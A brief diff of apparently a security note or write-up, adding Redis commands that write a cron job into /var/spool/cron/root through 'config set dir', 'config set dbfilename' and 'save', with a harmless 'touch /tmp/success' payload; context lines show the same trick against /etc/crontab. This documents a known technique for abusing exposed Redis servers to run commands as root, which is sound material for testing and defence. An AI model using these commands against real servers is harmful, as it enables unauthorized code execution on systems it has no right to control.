@@ -56,6 +56,9 @@ config set dir /etc/
 config set dbfilename crontab
 save
 
-/var/spool/cron/crontabs/root
+set 1 "\n\n\n\n* * * * * touch /tmp/success\n\n\n\n"
+config set dir /var/spool/cron/
+config set dbfilename root
+save
 ```
 
